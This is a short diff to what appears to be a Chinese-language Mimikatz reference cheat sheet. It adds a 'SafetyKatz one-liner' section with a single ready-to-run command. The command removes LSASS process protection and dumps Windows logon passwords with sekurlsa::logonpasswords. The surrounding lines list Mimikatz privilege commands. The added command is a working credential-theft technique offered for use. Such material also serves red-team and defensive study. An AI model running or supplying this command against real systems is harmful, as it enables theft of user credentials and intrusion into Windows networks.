@@ -115,6 +115,13 @@ PID 528 -> 00/00 [0-0-0]
 
 此文档参考内容见[这里](https://tools.thehacker.recipes/mimikatz/modules)
 
+# SafetyKatz.exe一句话
+
+```
+.\SafetyKatz.exe "!+" "!processprotect /process:lsass.exe /remove" "sekurlsa::logonpasswords" "exit"
+```
+
+
 # privilege
 ```
 privilege::backup requests the backup privilege (SeBackupPrivilege)
